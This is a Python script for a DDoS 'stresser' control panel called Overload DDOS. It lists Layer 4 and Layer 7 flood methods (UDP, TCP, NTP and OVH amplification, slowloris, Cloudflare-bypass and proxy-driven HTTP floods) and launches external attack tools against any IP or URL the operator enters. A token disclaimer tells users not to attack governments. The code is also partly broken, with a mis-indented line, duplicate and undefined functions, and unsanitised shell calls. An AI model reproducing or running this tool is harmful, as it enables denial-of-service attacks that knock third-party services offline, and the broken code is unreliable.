import socket
import os
import requests
import random
import getpass
import time
import sys
import math
import curses
import blessed
import subprocess
import threading
from flask import Flask, request, jsonify
from colorama import Fore, Style

term = blessed.Terminal()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def generate_logo():
    logo = r"""
    ⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⣰⡾⠛⠛⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢀⣿⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠸⣧⡀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠈⠻⣦⣀⣀⣀⣠⣾⠷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⡤⠀
    ⠀⠀⠀⠀⠀⠀⠈⠛⠉⠉⠙⣷⣴⠟⠛⣷⣄⠀⠀⠀⠀⢿⡟⠛⠉⠉⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡾⠋⢙⣷⣄⠀⠀⢸⡇⠀⢠⡶⣶⣦⣤⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡟⠉⣹⣷⣄⠘⣿⢀⣿⠁⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡏⢀⣿⢷⣿⣾⠃⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣁⣴⠟⣿⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡿⠷⢶⣾⣿⣷⣴⠟T.ME/POWERPROOFOVERLOAD⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣨⣿⣾⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠀⠈⠛⠂⠀⠀⠀
    """
    return logo

def random_color():
    return f"\033[38;5;{random.randint(0, 255)}m"

def si():
    logo = generate_logo()
    duration = 10
    start_time = time.time()

    while time.time() - start_time < duration:
        clear_screen()
        print(random_color() + logo + "\033[0m")
        time.sleep(0.1)
        
app = Flask(__name__)

def get_ip_info(url):
    response = requests.get(f'https://ipinfo.io/{url}?token=727e8c2fa5b07c')  
    response.raise_for_status()
    return response.json()         

@app.route('/')                                                             
def si():
    run_si_in_background() 
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mt.me/POWERPROOFOVERLOAD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Overload DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0')
    print("")                

def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpbypass            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mreset         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpget             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-spoof      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mbrowser            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-requests        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux                \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstress           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mbrutal             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║                        
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m1. The owner does not recommend attacking the government, if you do so you must be willing to take responsibility and accept all risks   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Only attack for testing servers                                                                                                                    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m3. The creator is not responsible if this tool is used by the wrong person for unlawful activities                                                \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def run_si_in_background():
    threading.Thread(target=si).start()
    
def menu():
    sys.stdout.write(f"         \x1b]2;Overload Server --> Online Botnet: [{bots}] | Stresser Panel | VIP (true)\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mt.me/POWERPROOFOVERLOAD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Overload DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0')
    print("")
    print("""  
                            ████████████                
                       ██████         ██████          
                    ████                      ████                
                    ██                             ██      
                                              
                           ████████████                
                            ██            ██              
                           ██              ██            
                                              
                                              
                                 ████                    
                               ██    ██                  
                               ██    ██                  
                               ██    ██                  
                               ██    ██                  
                               ██    ██                  
    ██████████████████████████████████████    
  ██                                         ██  
██    ████                                    ██
██  ██    ██                                  ██
██  ██    ██                                  ██
██    ████                                    ██
  ██                                         ██
     ██████████████████████████████████████    
                     Simple C2 Overload 2024
                     Version : 2.0
                     MADE BY : RzLModz 🚀    
                                                                                                                                                     
\x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
\x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to Overload DDOS Panel        \x1b[38;2;0;49;147m║
\x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239m DDoS Panel 2024\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
\x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
\x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
\x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://t.me/POWERPROOFOVERLOAD \x1b[38;2;0;49;147m║
\x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
\x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
\x1b[38;2;0;212;14m║
\x1b[38;2;239;239;239mLAYER7  ► SHOW LAYER7 METHODS FOR ATTACK DOMAIN
LAYER4  ► SHOW LAYER4 METHODS FOR ATTACK IP
RULES   ► RULES PANEL
CLEAR   ► CLEAR TERMINAL \x1b[38;2;0;49;147m║
\x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@Ko\x1b[38;2;0;150;88mmin\x1b[38;2;0;113;133mfo\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()    
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()    
                        

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')
                
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')
               
        elif "brutal" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                bytes = cnc.split()[3]
                thrs = cnc.split()[4]
                bost = cnc.split()[5]
                os.system(f'python3 brutal.py {ip} {port} {bytes} {thrs} {bost}')           
            except IndexError:    
                print('Example: brutal 1.1.1.1 80 500 500 Y/N')

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')     
                
# LAYER 7 METHODS
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "reset" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node resetv2 {url} {time} 100 100 proxies.txt --full')
                os.system(f'node reset {url} {time} 100 100 proxies.txt')
                sys.stdout.write(f"\x1b]2; Attack Running\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {url}
Time: {time}s
Method: reset
Type [CLS] to clear the terminal""")
            except IndexError:
                print('Usage: reset <url> <time>')
                print('Example: reset http://example.com 60')
            except ValueError:
                print('Time end. Attack Stop')

        elif "httpbypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypass {url} {time} 100 100 proxies.txt')
                os.system(f'node httpbypassv2 {url} {time} 100 100 proxies.txt')
                ip_info = get_ip_info(url)
            print(ip_info)
                sys.stdout.write(f"\x1b]2; Attack Running\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {url}
Time: {time}s
Method: httpbypass
Type [CLS] to clear the terminal""")
            except IndexError:
                print('Usage: httpbypass <url> <time>')
                print('Example: httpbypass http://example.com 60')
            except ValueError:
                print('Time end. Attack Stop')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-requests.js {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "tls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node tls {url} {time} 500 500 proxies.txt')
                os.system(f'node tlsv2 {url} {time} 500 500 proxies.txt')
                sys.stdout.write(f"\x1b]2; Attack Running\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {url}
Time: {time}s
Method: tls
Type [CLS] to clear the terminal""")           
            except IndexError:
                print('Usage: tls <url> <time>')
                print('Example: tls http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')
                
        elif "browser" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'node browserv2 {url} {time} 100 100 proxies.txt')
                os.system(f'node browser {url} 100 proxies.txt 100 {time} true --fin true --load true --headers true --reconnect true --ipv6 true')
                sys.stdout.write(f"\x1b]2; Attack Running\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {url}
Time: {time}s
Method: browser
Type [CLS] to clear the terminal""")
            except IndexError:
                print('Usage: browser <url> <time>')
                print('Example: browser http://example.com 60')
            except ValueError:
                print('Time end. Attack Stop')        

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpget GET {url} {time} 100 100 proxies.txt')
                os.system(f'node httpgetv2 GET {url} {time} 100 100 proxies.txt')
                sys.stdout.write(f"\x1b]2; Attack Running\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {url}
Time: {time}s
Method: httpget
Type [CLS] to clear the terminal""")
            except IndexError:
                print('Usage: httpget <url> <time>')
                print('Example: httpget http://example.com 60')
            except ValueError:
                print('Time end. Attack Stop')
                
        elif "http-storm" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node storm.js {url} {time} {per} {thread} proxies.txt')
            except IndexError:
                print('Usage: http-storm <url> <time> <req> <thread> <proxies.txt>')
                print('Example: http-storm http://example.org 300 15000 1250 proxies.txt ')               

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
                
if __name__ == '__main__':
    app.run(debug=True)                


def login():
    user = "start"
    passwd = "start"
    username = input("🔐 Username: ")
    password = getpass.getpass(prompt='🔑 Password: ')
    if username != user or password != passwd:
        print("")
        print("❌ AKSES DITOLAK ❌")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Successful Login")
        time.sleep(0.3)
        main()

login()
                                                                                                   